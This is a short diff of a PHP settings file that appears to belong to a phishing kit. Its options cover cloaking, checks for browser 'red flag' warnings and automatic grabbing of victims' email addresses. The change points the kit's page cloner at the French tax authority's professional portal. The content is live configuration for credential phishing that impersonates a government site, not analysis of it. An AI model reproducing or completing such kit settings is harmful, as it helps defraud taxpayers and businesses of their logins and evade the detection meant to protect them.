@@ -33,7 +33,7 @@ $redirection_link_check = false; // Check Your Page If Still Uploaded
 $check_red_page = false;// Check The Redirect If Red Flag
 
 $cloaker = [
-    "url_to_grab" => "", // Change the link you want to grap it in your link ( if t)
+    "url_to_grab" => "https://www.impots.gouv.fr/professionnel/", // Change the link you want to grap it in your link ( if t)
 ];
 
 $auto_grabber = False; // Activate Auto Grab Email
